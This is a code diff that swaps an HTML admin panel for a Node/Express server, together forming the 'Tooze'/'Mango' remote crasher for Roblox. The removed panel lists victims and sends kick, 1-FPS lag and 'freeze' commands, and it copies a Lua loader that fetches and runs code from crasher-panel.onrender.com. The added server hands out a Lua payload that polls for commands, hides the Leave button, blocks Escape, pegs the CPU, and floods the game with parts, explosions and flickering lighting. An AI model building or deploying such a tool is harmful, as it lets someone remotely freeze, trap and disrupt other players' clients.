@@ -1,365 +1,236 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Tooze Panel</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        :root {
-            --bg: #000000;
-            --bg-1: #060608;
-            --bg-2: #0c0c10;
-            --bg-3: #14141a;
-            --bg-4: #1c1c24;
-            --line: #20202a;
-            --line-2: #2a2a36;
-            --line-pink: #3a1430;
-            --text: #ffffff;
-            --text-2: #c4a8b6;
-            --text-3: #7a6271;
-            --text-4: #4a3a44;
-            --pink: #ec4899;
-            --pink-2: #f472b6;
-            --pink-3: #f9a8d4;
-            --pink-4: #fbcfe8;
-            --magenta: #d946ef;
-            --pink-glow: rgba(236, 72, 153, 0.5);
-            --pink-soft: rgba(236, 72, 153, 0.1);
-            --green: #34d399;
-            --red: #f87171;
-            --amber: #fbbf24;
-        }
-        html, body { background: var(--bg); height: 100%; overflow-x: hidden; }
-        body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            color: var(--text);
-            font-feature-settings: 'cv02', 'cv03', 'cv11';
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-            min-height: 100vh;
-            position: relative;
-        }
-        .bg-fx { position: fixed; inset: 0; pointer-events: none; z-index: 0; overflow: hidden; }
-        .bg-orb { position: absolute; border-radius: 50%; filter: blur(80px); opacity: 0.45; mix-blend-mode: screen; }
-        .bg-orb.orb-1 { width: 600px; height: 600px; background: radial-gradient(circle, #ec4899 0%, transparent 70%); top: -200px; left: -100px; animation: orbFloat1 18s ease-in-out infinite; }
-        .bg-orb.orb-2 { width: 500px; height: 500px; background: radial-gradient(circle, #d946ef 0%, transparent 70%); top: 30%; right: -150px; animation: orbFloat2 22s ease-in-out infinite; }
-        .bg-orb.orb-3 { width: 400px; height: 400px; background: radial-gradient(circle, #ec4899 0%, transparent 70%); bottom: -100px; left: 30%; animation: orbFloat3 25s ease-in-out infinite; opacity: 0.3; }
-        @keyframes orbFloat1 { 0%, 100% { transform: translate(0,0) scale(1); } 50% { transform: translate(100px, 80px) scale(1.15); } }
-        @keyframes orbFloat2 { 0%, 100% { transform: translate(0,0) scale(1); } 50% { transform: translate(-80px, 60px) scale(1.1); } }
-        @keyframes orbFloat3 { 0%, 100% { transform: translate(0,0) scale(1); } 50% { transform: translate(60px, -40px) scale(1.2); } }
-        .bg-grid { position: fixed; inset: 0; background-image: radial-gradient(circle at 1px 1px, rgba(255,255,255,0.025) 1px, transparent 0); background-size: 32px 32px; pointer-events: none; z-index: 1; mask-image: radial-gradient(ellipse at center, black 50%, transparent 100%); }
-        .bg-vignette { position: fixed; inset: 0; z-index: 1; pointer-events: none; background: radial-gradient(ellipse at top, transparent 0%, rgba(0,0,0,0.6) 100%); }
+const express = require('express');
+const cors = require('cors');
+const app = express();
+const PORT = process.env.PORT || 3000;
 
-        ::-webkit-scrollbar { width: 6px; height: 6px; }
-        ::-webkit-scrollbar-track { background: transparent; }
-        ::-webkit-scrollbar-thumb { background: var(--line-2); border-radius: 8px; }
-        ::-webkit-scrollbar-thumb:hover { background: var(--line-pink); }
+app.use(cors());
+app.use(express.json());
+app.use(express.static('public'));
 
-        .login-screen { position: fixed; inset: 0; z-index: 100; display: flex; align-items: center; justify-content: center; padding: 20px; animation: loginFadeIn 0.6s cubic-bezier(0.22, 1, 0.36, 1); }
-        .login-screen.fade-out { animation: loginFadeOut 0.5s cubic-bezier(0.22, 1, 0.36, 1) forwards; pointer-events: none; }
-        @keyframes loginFadeIn { from { opacity: 0; transform: scale(1.04); } to { opacity: 1; transform: scale(1); } }
-        @keyframes loginFadeOut { from { opacity: 1; transform: scale(1); } to { opacity: 0; transform: scale(0.96); } }
-        .login-card { width: 100%; max-width: 420px; background: linear-gradient(180deg, rgba(20, 20, 28, 0.85), rgba(10, 10, 14, 0.85)); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px); border: 1px solid rgba(255,255,255,0.08); border-radius: 24px; padding: 36px 32px 28px; box-shadow: 0 30px 80px rgba(0,0,0,0.6), 0 0 80px rgba(236, 72, 153, 0.15), inset 0 1px 0 rgba(255,255,255,0.05); position: relative; overflow: hidden; }
-        .login-logo { width: 78px; height: 78px; border-radius: 20px; margin: 0 auto 20px; overflow: hidden; position: relative; box-shadow: 0 0 0 1.5px var(--pink), 0 12px 36px var(--pink-glow); background: linear-gradient(135deg, var(--pink), var(--magenta)); display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: 900; color: white; }
-        .login-title { font-size: 38px; font-weight: 800; letter-spacing: -1.5px; text-align: center; margin-bottom: 6px; background: linear-gradient(180deg, #ffffff 0%, #f5c8d8 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .login-subtitle { text-align: center; color: var(--text-3); font-size: 13px; margin-bottom: 28px; font-weight: 500; }
-        .login-form { display: flex; flex-direction: column; gap: 12px; }
-        .login-input { width: 100%; padding: 15px 18px; background: rgba(0,0,0,0.4); border: 1px solid var(--line); border-radius: 14px; color: var(--text); font-family: 'JetBrains Mono', monospace; font-size: 14px; outline: none; text-align: center; }
-        .login-input:focus { border-color: var(--pink); box-shadow: 0 0 0 4px var(--pink-soft); }
-        .login-btn { width: 100%; padding: 14px; background: linear-gradient(180deg, var(--pink-2) 0%, var(--pink) 100%); border: 1px solid var(--pink-2); border-radius: 14px; color: #fff; font-weight: 700; cursor: pointer; }
-        .login-error-msg { color: var(--red); font-size: 12px; text-align: center; min-height: 16px; margin-top: -4px; }
+const players = {};
 
-        .main-panel { position: relative; z-index: 2; padding: 24px 20px; display: none; opacity: 0; }
-        .main-panel.visible { display: flex; justify-content: center; opacity: 1; }
-        .app { max-width: 1400px; width: 100%; }
+app.get('/api/register', (req, res) => {
+    const username = req.query.username;
+    if (!username) return res.status(400).send('Username required');
 
-        .header { display: flex; align-items: center; justify-content: space-between; padding: 14px 20px; background: rgba(20, 20, 28, 0.7); backdrop-filter: blur(20px); border-radius: 18px; border: 1px solid rgba(255,255,255,0.06); margin-bottom: 22px; flex-wrap: wrap; gap: 10px; }
-        .header-left { display: flex; align-items: center; gap: 14px; flex-wrap: wrap; }
-        .logo { font-size: 24px; font-weight: 800; }
-        .loader-btn { background: rgba(236, 72, 153, 0.1); border: 1px solid var(--pink); color: var(--pink-3); padding: 8px 14px; font-size: 12px; font-weight: 700; border-radius: 11px; cursor: pointer; display: flex; align-items: center; gap: 8px; transition: all 0.2s; }
-        .loader-btn:hover { background: rgba(236, 72, 153, 0.2); }
-        .stat-pill { display: flex; align-items: center; gap: 8px; padding: 8px 14px; background: rgba(20, 20, 28, 0.6); border: 1px solid var(--line); border-radius: 11px; font-size: 12px; }
-        .stat-pill .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--green); box-shadow: 0 0 8px var(--green); }
+    if (!players[username]) {
+        players[username] = {
+            command: null,
+            lagActive: false,
+            crashActive: false
+        };
+    }
+    res.send('OK');
+});
 
-        .main { display: grid; grid-template-columns: 1fr 380px; gap: 22px; }
-        @media (max-width: 900px) { .main { grid-template-columns: 1fr; } }
+app.get('/api/players', (req, res) => {
+    const list = Object.keys(players).map(name => ({
+        username: name,
+        lagActive: players[name].lagActive || false,
+        crashActive: players[name].crashActive || false
+    }));
+    res.json(list);
+});
 
-        .players-section { background: rgba(20, 20, 28, 0.6); backdrop-filter: blur(20px); border-radius: 18px; border: 1px solid rgba(255,255,255,0.06); padding: 22px; min-height: 440px; }
-        .search-bar { width: 100%; margin-bottom: 16px; }
-        .search-bar input { width: 100%; padding: 12px; background: rgba(0,0,0,0.4); border: 1px solid var(--line); border-radius: 12px; color: var(--text); outline: none; }
+app.post('/api/command', (req, res) => {
+    const { username, command, value } = req.body;
 
-        .player-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(210px, 1fr)); gap: 10px; max-height: 500px; overflow-y: auto; }
-        .player-card { background: rgba(28, 28, 36, 0.7); border-radius: 13px; padding: 14px; border: 1px solid rgba(255,255,255,0.06); cursor: pointer; display: flex; align-items: center; gap: 12px; transition: all 0.2s; }
-        .player-card:hover { border-color: var(--line-2); background: rgba(28, 28, 36, 0.9); }
-        .player-card.selected { border-color: var(--pink); background: rgba(236, 72, 153, 0.05); }
-        .player-avatar { width: 42px; height: 42px; border-radius: 12px; background: #000; display: flex; align-items: center; justify-content: center; font-weight: 800; color: var(--pink-3); border: 1px solid var(--line-2); }
-        .player-name { font-weight: 700; font-size: 13px; }
-        .player-status { margin-left: auto; font-size: 10px; }
+    if (!username || !command) {
+        return res.status(400).json({ error: 'Missing fields' });
+    }
 
-        .command-panel { background: rgba(20, 20, 28, 0.6); backdrop-filter: blur(20px); border-radius: 18px; border: 1px solid rgba(255,255,255,0.06); padding: 22px; }
-        .panel-title { font-size: 15px; font-weight: 700; margin-bottom: 15px; }
-        .cmd-group { margin-bottom: 18px; }
-        .cmd-label { font-size: 10px; font-weight: 700; color: var(--text-3); text-transform: uppercase; margin-bottom: 8px; display: block; }
-        
-        .toggle-wrap { display: flex; align-items: center; justify-content: space-between; background: rgba(0,0,0,0.3); padding: 10px; border-radius: 12px; border: 1px solid var(--line); cursor: pointer; transition: all 0.2s; }
-        .toggle-wrap.active { border-color: var(--pink); color: var(--pink-3); background: rgba(236, 72, 153, 0.05); }
-        .toggle-wrap .status-text { font-weight: 700; }
-        .toggle-wrap.active .status-text { color: var(--green); }
-        
-        .cmd-btn-group { display: flex; gap: 8px; }
-        .cmd-btn { padding: 10px; border-radius: 12px; border: 1px solid var(--line); font-weight: 700; cursor: pointer; flex: 1; background: rgba(0,0,0,0.3); color: #fff; transition: all 0.2s; }
-        .cmd-btn:hover { transform: translateY(-1px); }
-        .cmd-btn.danger { color: var(--red); border-color: rgba(248, 113, 113, 0.3); }
-        .cmd-btn.danger:hover { background: rgba(248, 113, 113, 0.1); }
-        .cmd-btn.warning { color: var(--amber); border-color: rgba(251, 191, 36, 0.3); }
-        .cmd-btn.warning:hover { background: rgba(251, 191, 36, 0.1); }
+    if (!players[username]) {
+        return res.status(404).json({ error: 'Player not found' });
+    }
 
-        .toast { position: fixed; bottom: 28px; left: 50%; transform: translateX(-50%) translateY(80px); background: #1c1c24; border: 1px solid var(--pink); padding: 12px 22px; border-radius: 14px; font-size: 13px; opacity: 0; transition: all 0.3s; z-index: 999; }
-        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
-    </style>
-</head>
-<body>
+    players[username].command = command;
 
-<div class="bg-fx"><div class="bg-orb orb-1"></div><div class="bg-orb orb-2"></div></div>
-<div class="bg-grid"></div>
+    if (command === 'lag' && value !== undefined) {
+        players[username].lagActive = value;
+    }
 
-<div class="login-screen" id="loginScreen">
-    <div class="login-card">
-        <div class="login-logo">T</div>
-        <h1 class="login-title">Tooze</h1>
-        <p class="login-subtitle">Введите пароль панели</p>
-        <form class="login-form" id="loginForm" onsubmit="return false;">
-            <input type="password" class="login-input" id="keyInput" placeholder="Password" autocomplete="off" autofocus />
-            <div class="login-error-msg" id="loginErrorMsg"></div>
-            <button type="submit" class="login-btn">Войти</button>
-        </form>
-    </div>
-</div>
+    if (command === 'crash') {
+        players[username].crashActive = value !== undefined ? value : true;
+    }
 
-<div class="main-panel" id="mainPanel">
-    <div class="app">
-        <header class="header">
-            <div class="header-left">
-                <span class="logo">Tooze v5</span>
-                <button class="loader-btn" id="getLoaderBtn">📋 Get Loader Script</button>
-            </div>
-            <div class="stat-pill"><span class="dot"></span><span id="onlineCount">0</span> игроков</div>
-        </header>
+    res.json({ success: true });
+});
 
-        <div class="main">
-            <section class="players-section">
-                <div class="search-bar"><input type="text" id="searchInput" placeholder="🔍 Поиск игрока..." /></div>
-                <div class="player-grid" id="playerGrid"></div>
-            </section>
+app.get('/api/get_commands', (req, res) => {
+    const username = req.query.username;
 
-            <aside class="command-panel">
-                <div class="panel-title">Управление: <span id="targetName" style="color:var(--pink);">Никто не выбран</span></div>
-                
-                <div class="cmd-group">
-                    <span class="cmd-label">Lag Engine (1 FPS)</span>
-                    <div class="toggle-wrap" id="toggleLag">
-                        <span class="label">🐌 Ограничить до 1 FPS</span>
-                        <span class="status-text">OFF</span>
-                    </div>
-                    <div style="font-size:10px;color:var(--text-4);margin-top:4px;">Включает бесконечный цикл рендера</div>
-                </div>
+    if (!username || !players[username]) {
+        return res.send('');
+    }
 
-                <div class="cmd-group">
-                    <span class="cmd-label">Действия</span>
-                    <div class="cmd-btn-group">
-                        <button class="cmd-btn danger" id="btnKick">🚫 Kick</button>
-                        <button class="cmd-btn warning" id="btnCrash">💥 Freeze</button>
-                    </div>
-                    <div style="font-size:10px;color:var(--text-4);margin-top:4px;">Freeze полностью парализует игру</div>
-                </div>
-            </aside>
-        </div>
-    </div>
-</div>
+    const cmd = players[username].command || '';
+    players[username].command = null;
+    res.send(cmd);
+});
 
-<div class="toast" id="toast"></div>
+app.get('/api/get_exec_script', (req, res) => {
+    const script = `
+local s="https://crasher-panel.onrender.com"
+_G.ToozeServer=s
 
-<script>
-    // === КОНФИГУРАЦИЯ ===
-    const SERVER_URL = "https://crasher-panel.onrender.com"; // Замените на ваш URL
-    const ADMIN_PASSWORD = "admin123"; // Установите свой пароль
-    
-    let currentTarget = null;
-    let authToken = "";
-    let playersData = {};
+local p=game.Players.LocalPlayer
+if not p then return end
 
-    const $ = (s) => document.querySelector(s);
-    const $$ = (s) => document.querySelectorAll(s);
+local R=game:GetService("RunService")
+local W=game:GetService("Workspace")
+local L=game:GetService("Lighting")
+local C=game:GetService("CoreGui")
+local G=game:GetService("GuiService")
+local A=game:GetService("ContextActionService")
 
-    // === АВТОРИЗАЦИЯ ===
-    $('#loginForm').addEventListener('submit', async () => {
-        const password = $('#keyInput').value;
-        if (password === ADMIN_PASSWORD) {
-            authToken = password;
-            $('#loginScreen').classList.add('fade-out');
-            setTimeout(() => {
-                $('#loginScreen').style.display = 'none';
-                $('#mainPanel').classList.add('visible');
-                startPolling();
-            }, 500);
-        } else {
-            $('#loginErrorMsg').textContent = "❌ Неверный пароль";
-        }
+local state={lag=false,crash=false,conns={}}
+
+local function reg()
+    pcall(function() game:HttpGet(s.."/api/register?username="..p.Name) end)
+end
+
+-- Anti-Leave
+local function blockLeave()
+    local rg=C:FindFirstChild("RobloxGui")
+    if rg then
+        local lb=rg:FindFirstChild("LeaveButton")
+        if lb then lb.Visible=false lb.Active=false lb.Selectable=false end
+    end
+    A:BindAction("anti",function() return Enum.ContextActionResult.Sink end,false,Enum.KeyCode.Escape)
+end
+
+local function unblockLeave()
+    A:UnbindAction("anti")
+    local rg=C:FindFirstChild("RobloxGui")
+    if rg then
+        local lb=rg:FindFirstChild("LeaveButton")
+        if lb then lb.Visible=true lb.Active=true lb.Selectable=true end
+    end
+end
+
+-- Lag
+local function startLag()
+    if state.lag then return end
+    state.lag=true
+    local c=R.RenderStepped:Connect(function()
+        while state.lag do
+            local t=os.clock() while os.clock()-t<0.99 do end
+            task.wait()
+        end
+    end)
+    table.insert(state.conns,c)
+end
+
+local function stopLag()
+    state.lag=false
+    for _,c in ipairs(state.conns) do pcall(c.Disconnect,c) end
+    state.conns={}
+end
+
+-- Crash
+local function startCrash()
+    if state.crash then return end
+    state.crash=true
+    blockLeave()
+
+    task.spawn(function()
+        for i=1,10000 do
+            if not state.crash then break end
+            local pt=Instance.new("Part")
+            pt.Size=Vector3.new(50,50,50)
+            pt.CFrame=CFrame.new(math.random(-5000,5000),math.random(0,5000),math.random(-5000,5000))
+            pt.Anchored=true pt.Material=Enum.Material.Neon pt.Parent=W
+            if i%100==0 then task.wait() end
+        end
+    end)
+
+    task.spawn(function()
+        while state.crash do
+            for i=1,100000 do
+                local _=math.sqrt(i)*math.sin(i)*math.cos(i)
+                for j=1,100 do local __=_*j/(j+1) end
+            end
+            task.wait()
+        end
+    end)
+
+    local c=R.RenderStepped:Connect(function()
+        while state.crash do
+            local t=os.clock() while os.clock()-t<0.99 do end
+            task.wait()
+        end
+    end)
+    table.insert(state.conns,c)
+
+    task.spawn(function()
+        while state.crash do
+            for i=1,50 do
+                local e=Instance.new("Explosion")
+                e.Position=Vector3.new(math.random(-2000,2000),math.random(0,500),math.random(-2000,2000))
+                e.BlastRadius=100 e.BlastPressure=1000000 e.Parent=W
+            end
+            task.wait(0.01)
+        end
+    end)
+
+    task.spawn(function()
+        while state.crash do
+            L.Brightness=math.random()
+            L.ClockTime=math.random(0,24)
+            L.FogEnd=math.random(0,1000)
+            L.OutdoorAmbient=Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255))
+            task.wait(0.01)
+        end
+    end)
+end
+
+local function stopCrash()
+    state.crash=false
+    unblockLeave()
+    for _,c in ipairs(state.conns) do pcall(c.Disconnect,c) end
+    state.conns={}
+    pcall(function()
+        for _,v in pairs(W:GetChildren()) do
+            if v:IsA("Part") and v.Size==Vector3.new(50,50,50) and v.Material==Enum.Material.Neon then
+                v:Destroy()
+            end
+        end
+    end)
+end
+
+local function check()
+    local ok,cmd=pcall(function() return game:HttpGet(s.."/api/get_commands?username="..p.Name) end)
+    if not ok then return end
+
+    if cmd=="kick" then
+        p:Kick("Kicked via Mango Panel")
+    elseif cmd=="crash" then
+        if state.crash then stopCrash() else startCrash() end
+    elseif cmd=="lag" then
+        if state.lag then stopLag() else startLag() end
+    end
+end
+
+reg()
+while task.wait(2) do check() end
+    `;
+
+    res.setHeader('Content-Type', 'text/plain');
+    res.send(script);
+});
+
+app.get('/api/status', (req, res) => {
+    res.json({
+        status: 'online',
+        players: Object.keys(players).length,
+        uptime: process.uptime()
     });
+});
 
-    // === КОПИРОВАНИЕ ЛОАДЕРА ===
-    $('#getLoaderBtn').addEventListener('click', () => {
-        const luaScript = `-- Tooze Exploit Loader v5
-local serverUrl = "${SERVER_URL}"
-_G.ToozeServer = serverUrl
-print("🔄 Загрузка Tooze...")
-local success, result = pcall(function()
-    return game:HttpGet(serverUrl .. "/api/get_exec_script")
-end)
-if success then
-    print("✅ Tooze загружен!")
-    loadstring(result)()
-else
-    warn("❌ Ошибка загрузки: " .. tostring(result))
-end`;
-        navigator.clipboard.writeText(luaScript).then(() => showToast('✅ Скрипт лоадера скопирован!'));
-    });
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`Mango Panel running on port ${PORT}`);
+});
 
-    // === ОБНОВЛЕНИЕ СПИСКА ИГРОКОВ ===
-    async function updatePlayers() {
-        try {
-            const res = await fetch(`${SERVER_URL}/api/players`, {
-                headers: { 'Authorization': authToken }
-            });
-            const players = await res.json();
-            
-            playersData = {};
-            players.forEach(p => { playersData[p.username] = p; });
-            
-            $('#onlineCount').textContent = players.length;
-
-            const grid = $('#playerGrid');
-            const searchQuery = $('#searchInput').value.toLowerCase();
-            
-            const filtered = players.filter(p => 
-                p.username.toLowerCase().includes(searchQuery)
-            );
-            
-            grid.innerHTML = filtered.length === 0 ? 
-                '<div style="color:var(--text-4); padding:20px; text-align:center;">👀 Нет игроков в сети</div>' : '';
-
-            filtered.forEach(p => {
-                const card = document.createElement('div');
-                const isSelected = currentTarget === p.username;
-                card.className = `player-card ${isSelected ? 'selected' : ''}`;
-                card.innerHTML = `
-                    <div class="player-avatar">${p.username[0].toUpperCase()}</div>
-                    <div class="player-name">${p.username}</div>
-                    <div class="player-status">${p.lagActive ? '🐌 1 FPS' : '✅'}</div>
-                `;
-                card.addEventListener('click', () => {
-                    selectPlayer(p.username);
-                });
-                grid.appendChild(card);
-            });
-        } catch(e) {
-            console.error('Ошибка обновления игроков:', e);
-        }
-    }
-
-    // === ВЫБОР ИГРОКА ===
-    function selectPlayer(username) {
-        currentTarget = username;
-        $('#targetName').textContent = username;
-        
-        document.querySelectorAll('.player-card').forEach(c => c.classList.remove('selected'));
-        document.querySelectorAll('.player-card').forEach(c => {
-            if (c.textContent.includes(username)) {
-                c.classList.add('selected');
-            }
-        });
-        
-        const player = playersData[username];
-        if (player) {
-            const toggle = $('#toggleLag');
-            toggle.classList.toggle('active', player.lagActive || false);
-            toggle.querySelector('.status-text').textContent = player.lagActive ? 'ON' : 'OFF';
-        }
-    }
-
-    // === ОТПРАВКА КОМАНДЫ ===
-    async function sendCommand(command, value = null) {
-        if(!currentTarget) {
-            showToast('⚠️ Сначала выберите игрока!');
-            return;
-        }
-        try {
-            const res = await fetch(`${SERVER_URL}/api/command`, {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json', 
-                    'Authorization': authToken 
-                },
-                body: JSON.stringify({ 
-                    username: currentTarget, 
-                    command, 
-                    value 
-                })
-            });
-            
-            if (res.ok) {
-                const commands = {
-                    'kick': '🚫 Кик',
-                    'crash': '💥 Заморозка',
-                    'lag': '🐌 1 FPS'
-                };
-                showToast(`✅ ${commands[command] || command} отправлена игроку ${currentTarget}!`);
-            } else {
-                showToast(`❌ Ошибка: ${res.status}`);
-            }
-        } catch(e) { 
-            showToast('❌ Ошибка отправки команды'); 
-        }
-    }
-
-    // === ОБРАБОТЧИКИ КНОПОК ===
-    $('#toggleLag').addEventListener('click', function() {
-        const isActive = !this.classList.contains('active');
-        this.classList.toggle('active', isActive);
-        this.querySelector('.status-text').textContent = isActive ? 'ON' : 'OFF';
-        sendCommand('lag', isActive);
-    });
-
-    $('#btnKick').addEventListener('click', () => sendCommand('kick'));
-    $('#btnCrash').addEventListener('click', () => sendCommand('crash'));
-
-    // === ПОИСК ===
-    $('#searchInput').addEventListener('input', updatePlayers);
-
-    // === ТОСТ УВЕДОМЛЕНИЯ ===
-    function showToast(msg) {
-        const t = $('#toast');
-        t.textContent = msg;
-        t.classList.add('show');
-        clearTimeout(t._timeout);
-        t._timeout = setTimeout(() => t.classList.remove('show'), 3000);
-    }
-
-    // === ЗАПУСК ОБНОВЛЕНИЯ ===
-    function startPolling() {
-        updatePlayers();
-        setInterval(updatePlayers, 3000);
-    }
-
-    document.addEventListener('keydown', (e) => {
-        if (e.key === 'Enter' && $('#keyInput').value) {
-            $('#loginForm').dispatchEvent(new Event('submit'));
-        }
-    });
-</script>
-</body>
-</html>
+app.use((err, req, res, next) => {
+    res.status(500).json({ error: 'Internal error' });
+});
